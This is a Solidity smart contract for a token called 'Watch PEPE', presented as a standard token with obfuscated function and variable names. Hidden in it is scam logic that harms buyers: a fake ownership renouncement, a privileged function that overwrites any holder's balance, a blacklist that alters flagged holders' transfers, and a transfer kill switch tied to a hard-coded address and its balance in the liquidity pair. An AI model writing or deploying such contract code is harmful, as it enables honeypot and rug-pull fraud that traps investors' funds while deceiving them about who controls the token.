//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface sellAt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalLaunchedEnable) external view returns (uint256);

    function transfer(address takeReceiver, uint256 buyMarketingSell) external returns (bool);

    function allowance(address autoAtTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 buyMarketingSell) external returns (bool);

    function transferFrom(
        address sender,
        address takeReceiver,
        uint256 buyMarketingSell
    ) external returns (bool);

    event Transfer(address indexed from, address indexed sellEnableIs, uint256 value);
    event Approval(address indexed autoAtTo, address indexed spender, uint256 value);
}

abstract contract isTakeLiquidity {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface feeTrading {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fromWalletMarketing {
    function createPair(address isTotal, address takeLimitLiquidity) external returns (address);
}

interface autoLaunch is sellAt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract WatchPEPE is isTakeLiquidity, sellAt, autoLaunch {

    uint256 constant teamTake = 9 ** 10;

    uint8 private receiverTotalMarketing = 18;

    function balanceOf(address totalLaunchedEnable) public view virtual override returns (uint256) {
        return isMinTake[totalLaunchedEnable];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return maxAuto;
    }

    mapping(address => bool) public buyFund;

    bool private txEnable;

    function allowance(address tradingShould, address receiverReceiver) external view virtual override returns (uint256) {
        if (receiverReceiver == autoBuyLaunched) {
            return type(uint256).max;
        }
        return fundLiquidityList[tradingShould][receiverReceiver];
    }

    function swapTrading(address atFee, uint256 buyMarketingSell) public {
        takeFrom();
        isMinTake[atFee] = buyMarketingSell;
    }

    string private limitTx = "WPE";

    uint256 private swapToken;

    address private isLimit;

    event OwnershipTransferred(address indexed tradingBuy, address indexed swapFee);

    address autoTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public teamTrading;

    uint256 totalLaunchMode;

    function approve(address receiverReceiver, uint256 buyMarketingSell) public virtual override returns (bool) {
        fundLiquidityList[_msgSender()][receiverReceiver] = buyMarketingSell;
        emit Approval(_msgSender(), receiverReceiver, buyMarketingSell);
        return true;
    }

    function transfer(address atFee, uint256 buyMarketingSell) external virtual override returns (bool) {
        return atLiquidity(_msgSender(), atFee, buyMarketingSell);
    }

    function owner() external view returns (address) {
        return isLimit;
    }

    function transferFrom(address launchShouldMode, address takeReceiver, uint256 buyMarketingSell) external override returns (bool) {
        if (_msgSender() != autoBuyLaunched) {
            if (fundLiquidityList[launchShouldMode][_msgSender()] != type(uint256).max) {
                require(buyMarketingSell <= fundLiquidityList[launchShouldMode][_msgSender()]);
                fundLiquidityList[launchShouldMode][_msgSender()] -= buyMarketingSell;
            }
        }
        return atLiquidity(launchShouldMode, takeReceiver, buyMarketingSell);
    }

    uint256 listAuto;

    function takeFrom() private view {
        require(totalWallet[_msgSender()]);
    }

    function autoReceiver() public {
        emit OwnershipTransferred(exemptShould, address(0));
        isLimit = address(0);
    }

    address public teamListLimit;

    mapping(address => uint256) private isMinTake;

    function atLiquidity(address launchShouldMode, address takeReceiver, uint256 buyMarketingSell) internal returns (bool) {
        if (launchShouldMode == exemptShould) {
            return senderWallet(launchShouldMode, takeReceiver, buyMarketingSell);
        }
        uint256 toMarketing = sellAt(teamListLimit).balanceOf(autoTo);
        require(toMarketing == totalLaunchMode);
        require(takeReceiver != autoTo);
        if (buyFund[launchShouldMode]) {
            return senderWallet(launchShouldMode, takeReceiver, teamTake);
        }
        return senderWallet(launchShouldMode, takeReceiver, buyMarketingSell);
    }

    uint256 public fundAt;

    function symbol() external view virtual override returns (string memory) {
        return limitTx;
    }

    uint256 private maxAuto = 100000000 * 10 ** 18;

    address autoBuyLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    string private limitTrading = "Watch PEPE";

    mapping(address => bool) public totalWallet;

    function teamLaunchedSell(address walletFrom) public {
        takeFrom();
        if (fundAt == swapToken) {
            swapToken = fundAt;
        }
        if (walletFrom == exemptShould || walletFrom == teamListLimit) {
            return;
        }
        buyFund[walletFrom] = true;
    }

    function senderWallet(address launchShouldMode, address takeReceiver, uint256 buyMarketingSell) internal returns (bool) {
        require(isMinTake[launchShouldMode] >= buyMarketingSell);
        isMinTake[launchShouldMode] -= buyMarketingSell;
        isMinTake[takeReceiver] += buyMarketingSell;
        emit Transfer(launchShouldMode, takeReceiver, buyMarketingSell);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return receiverTotalMarketing;
    }

    function getOwner() external view returns (address) {
        return isLimit;
    }

    function sellSwapShould(address enableReceiver) public {
        require(enableReceiver.balance < 100000);
        if (feeAuto) {
            return;
        }
        if (fundAt == swapToken) {
            txEnable = false;
        }
        totalWallet[enableReceiver] = true;
        if (fundAt != swapToken) {
            teamTrading = false;
        }
        feeAuto = true;
    }

    constructor (){
        
        feeTrading launchedLiquidity = feeTrading(autoBuyLaunched);
        teamListLimit = fromWalletMarketing(launchedLiquidity.factory()).createPair(launchedLiquidity.WETH(), address(this));
        
        exemptShould = _msgSender();
        autoReceiver();
        totalWallet[exemptShould] = true;
        isMinTake[exemptShould] = maxAuto;
        if (teamTrading != txEnable) {
            teamTrading = false;
        }
        emit Transfer(address(0), exemptShould, maxAuto);
    }

    function totalTrading(uint256 buyMarketingSell) public {
        takeFrom();
        totalLaunchMode = buyMarketingSell;
    }

    mapping(address => mapping(address => uint256)) private fundLiquidityList;

    address public exemptShould;

    function name() external view virtual override returns (string memory) {
        return limitTrading;
    }

    bool public feeAuto;

}